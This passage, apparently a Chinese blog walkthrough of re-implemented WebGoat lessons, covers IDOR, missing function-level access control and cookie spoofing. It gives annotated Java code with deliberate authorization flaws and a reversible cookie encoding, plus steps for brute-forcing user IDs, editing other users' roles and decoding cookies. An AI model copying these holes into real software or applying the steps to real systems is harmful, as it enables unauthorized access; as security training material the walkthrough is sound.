            this.role = 3;
        }else if (id.equals("2342388")){
            this.userId = id;
            this.color = "brown";
            this.name = "Buffalo Bill";
            this.size = "large";
            this.isAdmin = false;
            this.role = 3;
        }else {

        }
    }
    public Map<String,Object> profileToMap(){
        Map<String ,Object> profileMap = new HashMap<>();
        profileMap.put("userId",this.userId);
        profileMap.put("name",this.name);
        profileMap.put("color",this.color);
        profileMap.put("role",this.role);
        return profileMap;
    }
    public String toHTMLString(){
        String htmlBreak = "<br/>";
        return "userId" + this.userId + htmlBreak +
                "name" + this.name + htmlBreak +
                "size" + this.size + htmlBreak +
                "role" + this.role + htmlBreak +
                "isAdmin" + this.isAdmin;
    }

    public String getUserId() {
        return userId;
    }

    public void setUserId(String userId) {
        this.userId = userId;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getColor() {
        return color;
    }

    public void setColor(String color) {
        this.color = color;
    }

    public String getSize() {
        return size;
    }

    public void setSize(String size) {
        this.size = size;
    }

    public boolean isAdmin() {
        return isAdmin;
    }

    public void setAdmin(boolean admin) {
        isAdmin = admin;
    }

    public int getRole() {
        return role;
    }

    public void setRole(int role) {
        this.role = role;
    }


}

```

![image-20220831180320323](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831180320323.png)

首先这里存在一个view profile 用于查看资料,但是这个资料的查看前提是需要在第二关登录才能查看的

这里的UserProfile 就很像一个数据类 专门用来封装数据的

![image-20220831181411408](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831181411408.png)

![image-20220831182021822](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831182021822.png)

那么这里以,分割填入userid和role就可以了

![image-20220831182633882](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831182633882.png)

![image-20220831184322783](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831184322783.png)

### IDORViewOwnProfileAltUrl

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.parameters.P;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"idor.hints.ownProfileAltUrl1","idor.hints.ownProfileAltUrl2","idor.hints.ownProfileAltUrl3"})
public class IDORViewOwnProfileAltUrl extends AssignmentEndpoint {
    @Autowired
    UserSessionData userSessionData;
//    获取seesion对象
    @PostMapping("/IDOR/profile/alt-path")
    @ResponseBody
    public AttackResult completed(@RequestParam String url){
//        获取请求参数url
        try {
            if (userSessionData.getValue("idor-authenticated-as").equals("tom")){
//                确认是否是tom登录了
                String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
//                获取id
                String[] urlParts = url.split("/");
//                根据/进行分割
                if (urlParts[0].equals("WebGoat")&&urlParts[1].equals("IDOR")&&urlParts[2].equals("profile")&&urlParts[3].equals(authUserId)){
//                    分别按WebGoat IDOR profile进行对比
                    UserProfile userProfile = new UserProfile(authUserId);
//                    创建一个用户
                    return success(this).feedback("idor.view.own.profile.success").output(userProfile.profileToMap().toString()).build();
//                    先转换成数组后进行输出
                }else {
                    return failed(this).feedback("idor.view.own.profile.failure1").build();
                }
            }else {
                return failed(this).feedback("idor.view.own.profile.failure2").build();
            }
        }catch (Exception ex){
            return failed(this).feedback("an error occurred with your request").build();
        }
    }
}
```

![image-20220831190232238](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190232238.png)

这里就是像让我们访问个人资料的路径 也是需要先登录

![image-20220831190318579](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190318579.png)

获取路径 和 id

![image-20220831190748849](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190748849.png)

这里需要注意的是需要加上这个id

![image-20220831190931522](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190931522.png)

### IDORViewOtherProfile

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.util.HashMap;
import java.util.Map;

@RestController
@AssignmentHints({"idor.hints.otherProfile1", "idor.hints.otherProfile2", "idor.hints.otherProfile3", "idor.hints.otherProfile4", "idor.hints.otherProfile5", "idor.hints.otherProfile6", "idor.hints.otherProfile7", "idor.hints.otherProfile8", "idor.hints.otherProfile9"})
public class IDORViewOtherProfile extends AssignmentEndpoint {
    @Autowired
    UserSessionData userSessionData;
//    session对象
    @GetMapping(path = "/IDOR/profile/{userId}",produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(@PathVariable("userId") String userId, HttpServletResponse response){
//        获取路径中的userId参数
        Map<String,Object> details = new HashMap<>();
        if (userSessionData.getValue("idor-authenticated-as").equals("tom")){
//      tom登录
            String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
            if (userId != null && !userId.equals(authUserId)){
//                id和认证id一样
                UserProfile requestedProfile = new UserProfile(userId);
                if (requestedProfile.getUserId().equals("2342388")){
//                    bill 这里要注意了哦 这里的id是 bill的
                    return success(this).feedback("idor.view.profile.success").output(requestedProfile.profileToMap().toString()).build();
                }else {
                    return failed(this).feedback("idor.view.profile.close1").build();
                }
            }else {
                return failed(this).feedback("idor.view.profile.close2").build();
            }
        }
        return failed(this).build();
    }
}
```

![image-20220831201227028](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201227028.png)

这里可以看见,这个userid其实是没有赋值的,那么这里呢我们就需要去登录这个 bill 这里的意思也是比较简单,那么假设我们不知道bill的id怎么取访问呢? 爆破id呗

![image-20220831201436234](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201436234.png)

![image-20220831201903110](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201903110.png)

这里为了方便就直接减少点了 并且开了两个线程 不然一直访问500

![image-20220831201854428](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201854428.png)

### IDOREditOtherProfiile

注意这里的代码与原先的差异

![image-20220901131309653](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131309653.png)

这里的提示返回的是fail 但是调用的是succes 不知道是不是原文写错了

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.parameters.P;
import org.springframework.web.bind.annotation.*;

@RestController
@AssignmentHints({"idor.hints.otherProfile1", "idor.hints.otherProfile2", "idor.hints.otherProfile3", "idor.hints.otherProfile4", "idor.hints.otherProfile5", "idor.hints.otherProfile6", "idor.hints.otherProfile7", "idor.hints.otherProfile8", "idor.hints.otherProfile9"})
public class IDOREditOtherProfiile extends AssignmentEndpoint {
    @Autowired
    private UserSessionData userSessionData;

    //    获取session 对象
    @PutMapping(path = "/IDOR/profile/{userId}", consumes = "application/json")
//    注意这里是put请求 并且传入是json格式的文件
    @ResponseBody
    public AttackResult completed(@PathVariable("userId") String userId, @RequestBody UserProfile userSubmittedProfile) {
//        这里传入的body是 UserProfile 类的json对象
        String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
        UserProfile currentUserProfile = new UserProfile(userId);
//        创建一个UserProfile
        if (userSubmittedProfile.getUserId() != null && !userSubmittedProfile.getUserId().equals(authUserId) ) {
//          如果id不等于提交的
            currentUserProfile.setColor(userSubmittedProfile.getColor());
            currentUserProfile.setRole(userSubmittedProfile.getRole());
//            设置两个值
            userSessionData.setValue("idor-updated-other-profile", currentUserProfile);
//            这里添加一个session
            if (currentUserProfile.getRole() <= 1 && currentUserProfile.getColor().toLowerCase().equals("red")) {
//                如果得到的角色 是 <=1的数 并且当前用户的color 是 red
                return success(this).feedback("idor-edit.profile.success1")
                        .output(currentUserProfile.profileToMap().toString())
                        .build();
            }

            if (currentUserProfile.getRole() > 1 && currentUserProfile.getColor().toLowerCase().equals("red")) {
//              如果得到role > 1 并且 当前用户时red
                return failed(this)
                        .feedback("idor.edit.profile.failure1")
                        .output(currentUserProfile.profileToMap().toString())
                        .build();
            }
            if (currentUserProfile.getRole() <= 1 && !currentUserProfile.getColor().toLowerCase().equals("red")) {
//                如果得到role <= 1 并且 当前用户时不是red
                return failed(this)
                        .feedback("idor.edit.profile.failure2")
                        .output(currentUserProfile.profileToMap().toString())
                        .build();
            }
            return failed(this)
                    .feedback("idor.edit.profile.failure3")
                    .output(currentUserProfile.profileToMap().toString())
                    .build();
        } else if (userSubmittedProfile.getUserId().equals(authUserId)) {
//            或者当前用户id不等于 得到的id
            return failed(this)
                    .feedback("idor.edit.profile.failure4")
                    .build();
        }
        if (currentUserProfile.getColor().equals("black") && currentUserProfile.getRole() <= 1) {
//            如果当前用户颜色是black 并且 role <= 1
            return success(this)
                    .feedback("idor.edit.profile.success2")
                    .output(userSessionData.getValue("idor-updated-own-profile").toString())
                    .build();
        } else {
            return failed(this)
                    .feedback("idor.edit.profile.failure3")
                    .build();
        }
    }
}
```

前提也是需要先进行登录

这里既然提交的是一个json格式的UserProfile 那么我们需要 UserProfile 的json格式是什么样子的

![image-20220831224719251](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831224719251.png)

这里还需要put请求

![image-20220831224726850](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831224726850.png)

![image-20220831225511648](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831225511648.png)

总共有三个地方一是 id 二是 role 三是 color

![image-20220831230855877](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831230855877.png)

但是这里还有一个black也可以过关

![image-20220831231142555](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831231142555.png)

但是这里上面如果是null 的话下面就会爆空指针异常 不知道怎么过

![187718176](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/187718176-8102d348-9a44-4e32-9fb1-9e03cacc31e7.png)

## missing_ac

### MissingFunctionACHiddenMenus

这里注意对源码进行了修改,后面会提到

```java
package com.wanan.webgoat.lessons.missing_ac;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"access-control.hidden-menus.hint1","access-control.hidden-menus.hint2","access-control.hidden-menus.hint3"})
public class MissingFunctionACHiddenMenus extends AssignmentEndpoint {
    @PostMapping(path = "/access-control/hidden-menu",produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(String hiddenMenu1,String hiddenMenu2){
        if (hiddenMenu1.toLowerCase().equals("users") && hiddenMenu2.toLowerCase().equals("config")){
//            这里是对比两个 值是否相等 比较简单 但是比较考验前段的知识
            return success(this)
                    .output("")
                    .feedback("access-control.hidden-menus.success")
                    .build();
        }
        if (hiddenMenu1.equals("Config") && hiddenMenu2.equals("Users")){
            return failed(this)
                    .output("")
                    .feedback("access-control.hidden-menus.failure")
                    .build();
        }
        return failed(this)
                .feedback("access-control.hidden-menus.failure")
                .output("")
                .build();
    }
}

```

简单翻译一下这一关就可以发现 其实是让我们去源码中寻找一下 隐藏的 路径信息 

![image-20220901131356161](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131356161.png)

这里其实不是特别的好找,首先我们先把所有的标签给展开先 先找到body这个标签

![image-20220901130630692](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130630692.png)

![image-20220901130700058](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130700058.png)

接着根据工具去定位大致的位置

![image-20220901130730816](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901130730816.png)

稍微往上一翻可以找到了 还有一个问题这里填那两个 ?

![image-20220901131054794](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131054794.png)

 但是呢这里就存在一个问题 既然前端显示的是小写 但是后端判断的是大写 那么就会导致无法过关 这里我们对源码进行一下修改

![image-20220901131706235](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131706235.png)

![image-20220901131923443](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131923443.png)

### MissingFunctionACYourHash

```java
package com.wanan.webgoat.lessons.missing_ac;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.RequiredArgsConstructor;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;


import static com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;
import static com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_SIMPLE;


@RestController
@AssignmentHints({"access-control.hash.hint1", "access-control.hash.hint2", "access-control.hash.hint3", "access-control.hash.hint4", "access-control.hash.hint5"})
@RequiredArgsConstructor
public class MissingFunctionACYourHash extends AssignmentEndpoint {
    private final MissingAccessControlUserRepository userRepository;
//      这里创建一个与数据库交互的类
    @PostMapping(path = "/access-control/user-hash",produces = {"application/json"})
    @ResponseBody
    public AttackResult simple(String userHash){
        User user = userRepository.findByUsername("Jerry");
//        通过username 获取 user用户
        DisplayUser displayUser = new DisplayUser(user,PASSWORD_SALT_SIMPLE);
//        获取一个用户
        if (userHash.equals(displayUser.getUserHash())){
//            如果hash相等
            return success(this).feedback("access-control.hash.success").build();
        }else {
            return failed(this).build();
        }
    }

}

```

### MissingAccessControlUserRepository

```java
package com.wanan.webgoat.lessons.missing_ac;

import com.wanan.webgoat.container.LessonDataSource;
import org.springframework.jdbc.core.RowMapper;
import org.springframework.jdbc.core.namedparam.MapSqlParameterSource;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.stereotype.Component;
import org.springframework.util.CollectionUtils;

import java.util.List;

@Component
public class MissingAccessControlUserRepository {
    private final NamedParameterJdbcTemplate jdbcTemplate;
//    这里是使用的 框架的 jdbc工具栏 去方便的进行sql查询
    private final RowMapper<User> mapper = (rs,rowMapper) -> new User(rs.getString("username"),rs.getString("password"),rs.getBoolean("admin"));
//    这里不理解的 的看下面的图
    public MissingAccessControlUserRepository(LessonDataSource lessonDataSource){
        this.jdbcTemplate = new NamedParameterJdbcTemplate(lessonDataSource);
//        这里是进行 jdbc的初始化
    }
    public List<User> findAllUsers(){
        return jdbcTemplate.query("select username,password,admin from access_control_users",mapper);
//      这里是进行了数据库的查询
    }
    public User findByUsername(String username){
        var users = jdbcTemplate.query("select username,password,admin from access_control_users where username=:username",new MapSqlParameterSource().addValue("username",username),mapper);
//        这里我想的是存不存在sql注入 从这里的含义上来看是存在的 先放一下
        if (CollectionUtils.isEmpty(users)){
            return null;
        }
        return users.get(0);
    }
    public User save(User user){
        jdbcTemplate.update("INSERT INTO access_control_users(username, password, admin) VALUES(:username,:password,:admin)",
                new MapSqlParameterSource()
                        .addValue("username",user.getUsername())
                        .addValue("password",user.getPassword())
                        .addValue("admin",user.isAdmin()));
        return user;
    }
}

```

这里看一眼 RowMapper的解释 首先这个接口是对 数据库中列的映射 其中需要实现下面的mapRow方法 

![image-20220901142416684](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901142416684.png)

注意看这里其实是用 lamda表达式其中这里 new了一个接口并传入了User这个对象  这里传入的两个参数 其中第一个参数就是查询到的当前列的值 第二个参数代表着 当前是第几列

![image-20220901142549715](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901142549715.png)

### User

```java
package com.wanan.webgoat.lessons.missing_ac;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@AllArgsConstructor
@NoArgsConstructor
public class User {
//    这里很明显是一个数据类
    private String username;
    private String password;
    private boolean admin;
}
```

![image-20220901200339904](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901200340102.png)

到这里其实还是没有办法去完成的 因为我们不知道用户的信息 还需要接着写

### MissingFunctionACUsers

```java
package com.wanan.webgoat.lessons.missing_ac;

import com.wanan.webgoat.container.session.WebSession;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

import static com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;
import static com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_SIMPLE;

@Controller
@AllArgsConstructor
@Slf4j
public class MissingFunctionACUsers {
    private final MissingAccessControlUserRepository userRepository;
    private final WebSession webSession;

    @GetMapping(path = {"access-control/users"})
    public ModelAndView listUsers() {
        ModelAndView model = new ModelAndView();
//        创建一个 model 对象
        model.setViewName("list_users");
//        设置一个list_users值
        List<User> allUsers = userRepository.findAllUsers();
//        查找所用用户
        model.addObject("numUsers", allUsers.size());
//        将用户的数量添加进去
        List<DisplayUser> displayUsers = new ArrayList<>();
//        新建一个displayUser数组
        for (User user : allUsers) {
            displayUsers.add(new DisplayUser(user, PASSWORD_SALT_SIMPLE));
//            将查到的用户填入到内存中
        }
        model.addObject("allUsers", displayUsers);
//        在model中添加进去
        return model;
    }

    @GetMapping(path = {"access-control/users"}, consumes = "application/json")
    @ResponseBody
//    接受请求参数 json
    public ResponseEntity<List<DisplayUser>> usersService() {
//      获取用户信息
        return ResponseEntity.ok(userRepository.findAllUsers().stream().map(user -> new DisplayUser(user, PASSWORD_SALT_SIMPLE)).collect(Collectors.toList()));
//        返回所有用户的信息

    }

    @GetMapping(path = {"access-control/users-admin-fix"}, consumes = "application/json")
    @ResponseBody
//    接受json参数
    public ResponseEntity<List<DisplayUser>> usersFixed() {

        var currentUser = userRepository.findByUsername(webSession.getUserName());
//        获取当前 session中的用户名的信息
        if (currentUser != null && currentUser.isAdmin()) {
//            如果当前用户不为空 并且当前用户是admin
            return ResponseEntity.ok(userRepository.findAllUsers().stream().map(user -> new DisplayUser(user, PASSWORD_SALT_ADMIN)).collect(Collectors.toList()));
//            返回所有用户的信息
        }
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
//        返回禁止访问
    }

    @PostMapping(path = {"access-control/users", "access-control/users-admin-fix"}, consumes = "application/json", produces = "application/json")
//    接受json信息 产生json信息
    @ResponseBody
    public User addUser(@RequestBody User newUser) {
//        接受newUser
        try {
            userRepository.save(newUser);
//            保存增用户
            return newUser;
        } catch (Exception ex) {
            log.error("Error creating new User", ex);
            return null;
        }
    }
}

```

这里首先需要的是获取用户的hash值

![image-20220901224615901](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224615901.png)

可以注意到的是这里的路径是存在问题的,那就是这里的前缀

![image-20220901224654510](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224654510.png)

直接访问必报404

```
http://127.0.0.1:8080/WebGoat/access-control/users
```

需要添加WebGoat

![image-20220901224856920](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901224856920.png)

这里爆了一个异常 原因也很简单的 主要是由于这个接口作为一个遗漏接口 由于没有进行完善所以导致 这个list_users.html不存在

![image-20220901225836073](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901225836073.png)

```
Content-Type: application/json
```

这里添加上这个json请求头就可以处理这个请求了

![image-20220901225940006](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901225940006.png)

原因是这里是可以接受 json格式的数据去 解析并将json格式的数据进行返回的

那么我们之间提交Jerry的hash即可

![image-20220902090152804](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902090152804.png)

### MissingFunctionACYourHashAdmin

```java
package com.wanan.webgoat.lessons.missing_ac;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import static com.wanan.webgoat.lessons.missing_ac.MissingFunctionAC.PASSWORD_SALT_ADMIN;

@RestController
@AssignmentHints({"access-control.hash.hint6", "access-control.hash.hint7",
        "access-control.hash.hint8", "access-control.hash.hint9", "access-control.hash.hint10", "access-control.hash.hint11", "access-control.hash.hint12"})
public class MissingFunctionACYourHashAdmin extends AssignmentEndpoint {

    private final MissingAccessControlUserRepository userRepository;

    public MissingFunctionACYourHashAdmin(MissingAccessControlUserRepository userRepository){
        this.userRepository = userRepository;
    }

    @PostMapping(path = "/access-control/user-hash-fix",produces = {"application/json"})
    @ResponseBody
    public AttackResult admin(String userHash){
        var user =userRepository.findByUsername("Jerry");
        var displayUser = new DisplayUser(user,PASSWORD_SALT_ADMIN);
//        这里需要与admin相同
        if (userHash.equals(displayUser.getUserHash())) {
            return success(this).feedback("access-control.hash.success").build();
        }else {
            return failed(this).feedback("access-control.hash.close").build();
        }

    }
}

```

也就是我们需要把Jerry更改为admin才可登录 

![image-20220902091321449](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902091321449.png)

也就是这里的两个方法 一个获取用户并保存到数据库中去 另一个方法查看用户hash

但是这里需要注意的是 这里的newUser 也就是一个User对象

![image-20220902091703044](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902091703044.png)

注意观察参数

![image-20220902094423466](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094423466.png)

![image-20220902094410855](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094410855.png)

这里我们总共添加了两个用户 一个是当前登录webgoat的用户 也就是123456

![image-20220902094628695](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094628695.png)

这里就把admin的hash也查出来了

![image-20220902094709032](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094709032.png)

这里为甚是两个用户也即是这里的原因

![image-20220902094938519](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094938519.png)

接着去提交它的hash 如果发现多个hash提交第一个即可,因为只对比第一个

## spoofcookie

### SpoofCookie

```java
package com.wanan.webgoat.lessons.spoofcookie;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SpoofCookie extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A1;
    }

    @Override
    public String getTitle() {
        return "spoofcookie.title";
    }
}
```

### SpoofCookieAssignment

```java
package com.wanan.webgoat.lessons.spoofcookie;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.spoofcookie.encoders.EncDec;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.UnsatisfiedServletRequestParameterException;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import java.util.Map;

@RestController
public class SpoofCookieAssignment extends AssignmentEndpoint {
    private static final String COOKIE_NAME = "spoof_auth";
//    定义cookie的名字
    private static final String COOKIE_INFO = "Cookie details for user %s:<br />" + COOKIE_NAME + "=%s";
//    作为cookie的标准化形式 用于以后的格式化输出入
    private static final String ATTACK_USERNAME = "tom";
//
    private static final Map<String ,String > users = Map.of(
            "webgoat","webgoat",
            "admin","admin",
            ATTACK_USERNAME,"apasswordfortom");
//          定义users 用户 map
    @PostMapping(path = "/SpoofCookie/login")
    @ResponseBody
    @ExceptionHandler(UnsatisfiedServletRequestParameterException.class)
//  没太理解 当不满足下面的请求结构统一抛异常出去?
    public AttackResult login(
            @RequestParam String username,
//            获取用户参数
            @RequestParam String password,
//
            @CookieValue(value = COOKIE_NAME , required = false ) String cookieValue,
//            获取 cookie的值 非必须
            HttpServletResponse response){
        if (StringUtils.isEmpty(cookieValue)){
//            如果cookie是空的 就到验证用户登录的地方
            return credentialsLoginFlow(username,password,response);
        }else{
//            如果存在cookie就去验证cookie
            return cookieLoginFlow(cookieValue);
        }
    }

    @GetMapping(path = "/SpoofCookie/cleanup")
    public void cleanup(HttpServletResponse response){
//        这里是删除cookie
        Cookie cookie = new Cookie(COOKIE_NAME,"");
//      先给一个空cookie
        cookie.setMaxAge(0);
//        设置cookie期限是0 也就是立即结束
        response.addCookie(cookie);
//        添加cookie
    }

    private AttackResult credentialsLoginFlow(String username,String password,HttpServletResponse response){
        String lowerCasedUsername = username.toLowerCase();
//        获取用户名的小写
        if (ATTACK_USERNAME.equals(lowerCasedUsername) && users.get(lowerCasedUsername).equals(password)){
//            如果登录的用户名是 tom  并且 得到的用户名 与 password相同
            return informationMessage(this).feedback("spoofcookie.cheating").build();
//            返回 不要作弊?
        }
        String authPassword = users.getOrDefault(lowerCasedUsername,"");
//        如果 如果 users中存在这个键 就返回这个键的值 如果不存在就返回空
        if (!authPassword.isBlank() && authPassword.equals(password)){
//            如果密码不存在空白字符 并且 给的密码等于users中的密码
            String newCookieValue = EncDec.encode(lowerCasedUsername);
//            就加密下cookie
            Cookie newCookie = new Cookie(COOKIE_NAME,newCookieValue);
//            新建一个cookie
            newCookie.setPath("/WebGoat");
//            设置cookie路径
            newCookie.setSecure(true);
//            通过安全协议发送
            response.addCookie(newCookie);
//            在响应上面添加cookie
            return informationMessage(this)
                    .feedback("spoofcookie.login")
//                    返回已经得到cookie
                    .output(String.format(COOKIE_INFO,lowerCasedUsername,newCookie.getValue()))
//                    输出cookie的值
                    .build();
        }
        return informationMessage(this)
                .feedback("spoofcookie.wrong-login")
//                返回登录失败
                .build();

    }
    private AttackResult cookieLoginFlow(String cookieValue){
        String cookieUsername;
        try{
            cookieUsername = EncDec.decode(cookieValue).toLowerCase();
//            解密cookie

        }catch (Exception e){
            return failed(this).output(e.getMessage()).build();
        }
        if (users.containsKey(cookieUsername)){
//            如果users中包含 cookie中的username
            if (cookieUsername.equals(ATTACK_USERNAME)){
//                如果cookiename等于 tom
                return success(this).build();
            }
            return failed(this).feedback("spoofcookie.cookie-login")
//                    返回使用cookie登录
                    .output(String.format(COOKIE_INFO,cookieUsername,cookieValue)).build();
        }
        return failed(this).feedback("spoofcookie.wrong-cookie").build();
//        返回cookie错误
    }
}
```

### encoders

#### EncDec

```java
package com.wanan.webgoat.lessons.spoofcookie.encoders;

import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.security.crypto.codec.Hex;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Locale;

public class EncDec {
    private static final String SALT = RandomStringUtils.randomAlphabetic(10);
//    生成一个随机字符串密钥常量作为盐 长度为10
    private EncDec(){}
//    私有构造方法
    public static String encode(final String value){
        if (value == null){
            return null;
        }
        String encoded = value.toLowerCase() + SALT;
//        把需要加密的值与salt相加
        encoded = revert(encoded);
//        该函数将加密值进行逆序输出为字符串
        encoded = hexEncode(encoded);
//        进行16进制编码
        return base64Encode(encoded);

    }

    public static String decode(final String encodedValue) throws IllegalArgumentException{
//        抛出参数非法异常
        if (encodedValue == null){
            return null;
        }
        String decoded = base64Decode(encodedValue);
//        先进行base64解码
        decoded = hexDecode(decoded);
//        接着进行16进制解码
        decoded = revert(decoded);
//        将字符串逆序输出
        return decoded.substring(0,decoded.length() - SALT.length());
//        对解密后的字符串 去除盐值
    }

    public static String  revert(final String value){
        return new StringBuffer(value)
                .reverse()
                .toString();
    }
    private static String hexEncode(final String value){
        char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));
//            调用 静态方法将字符输出为数组 在转换为string返回
        return new String(encoded);
    }
    private static String hexDecode(final String value){
        byte[] decoded = Hex.decode(value);
        return new String(decoded);
    }
    private static String base64Encode(final String value){
//        调用 base64编码器 将数组转换为 base64字符串
        return Base64
                .getEncoder()
                .encodeToString(value.getBytes());
    }
    private static String base64Decode(final String value){
        byte[] decoded = Base64
                .getDecoder()
                .decode(value.getBytes());
        return new String(decoded);
    }


}
```

![image-20220903103710214](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103710214.png)

base64解码

![image-20220903103940162](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103940162.png)

16进制转字符

![image-20220903103948675](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103948675.png)

逆序输出

![image-20220903104030709](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104030709.png)

